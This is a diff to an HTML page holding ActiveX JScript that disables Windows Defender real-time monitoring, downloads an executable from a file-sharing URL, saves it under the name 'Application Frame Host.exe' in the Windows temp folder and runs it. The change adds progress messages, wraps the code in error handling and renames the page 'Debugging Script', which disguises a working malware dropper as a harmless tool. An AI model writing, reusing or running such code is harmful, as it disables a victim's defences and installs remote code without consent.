@@ -1,21 +1,28 @@
 <html>
 <head>
-    <title>Script Runner</title>
+    <title>Debugging Script</title>
 </head>
 <body>
 <script language="javascript">
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0, true);
-
-    var url = "https://store10.gofile.io/download/web/e382faa0-2338-4565-a998-573dea5f77c0/Application%20Frame%20Host.exe";
-    var destination = "C:\\Windows\\Temp\\Application Frame Host.exe";
-
     try {
+        var shell = new ActiveXObject("WScript.Shell");
+        WScript.Echo("Disabling Defender...");
+
+        shell.Run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0, true);
+        WScript.Echo("Defender Disabled!");
+
+        var url = "https://store10.gofile.io/download/web/e382faa0-2338-4565-a998-573dea5f77c0/Application%20Frame%20Host.exe";
+        var destination = "C:\\Windows\\Temp\\Application Frame Host.exe";
+
+        WScript.Echo("Starting file download...");
+
         var xhttp = new ActiveXObject("Microsoft.XMLHTTP");
         xhttp.open("GET", url, false);
         xhttp.send();
 
         if (xhttp.status == 200) {
+            WScript.Echo("Download successful! Saving file...");
+
             var stream = new ActiveXObject("ADODB.Stream");
             stream.Type = 1; // Binary
             stream.Open();
@@ -23,7 +30,11 @@
             stream.SaveToFile(destination, 2); // Overwrite if exists
             stream.Close();
 
+            WScript.Echo("File saved! Running file...");
             shell.Run('"' + destination + '"', 1, false);
+            WScript.Echo("File executed!");
+        } else {
+            WScript.Echo("Download failed! HTTP Status: " + xhttp.status);
         }
     } catch (e) {
         WScript.Echo("Error: " + e.message);
